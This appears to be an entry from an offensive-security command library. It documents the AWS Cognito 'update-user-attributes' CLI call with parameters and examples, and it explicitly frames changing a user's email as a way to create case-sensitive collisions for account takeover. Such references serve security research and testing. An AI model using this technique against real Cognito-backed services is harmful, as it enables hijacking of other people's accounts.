---
id: 2979dd69-e553-462d-b43b-510573ce43ec
type: command
executor: bash
data: >-
  aws cognito-idp update-user-attributes --region us-east-1 --access-token
  eyJraWQ[...]] --user-attributes
  Name=email,Value=flickr-Benign@lauritz-holtmann.de
output: null
created_at: '2025-12-11T06:10:15.728Z'
updated_at: '2025-12-11T06:10:15.728Z'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - aws
  - cognito
  - manipulation
verified: false
validated: true
submitted: true
---

# aws-cognito-update-user-attributes

## Command

```bash
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...]] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
```

## Description

Updates the user's email attribute in AWS Cognito to a new value, used to create case-sensitive collisions for account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--region` | Specifies the AWS region (us-east-1) | Yes |
| `--access-token` | The Cognito access token for authentication | Yes |
| `--user-attributes` | Specifies the attribute to update (Name=email) and its new value | Yes |

## Examples

### Basic Usage

```bash
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...]] --user-attributes Name=email,Value=newemail@example.com
```

### Advanced Usage

```bash
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...]] --user-attributes Name=email,Value=newemail@example.com Name=phone_number,Value=+1234567890
```

## Expected Output

JSON with CodeDeliveryDetailsList indicating email delivery for verification.

## Related

- [[commands/aws-cognito-get-user]]
- [[procedures/Update-User-Email-Attribute]]
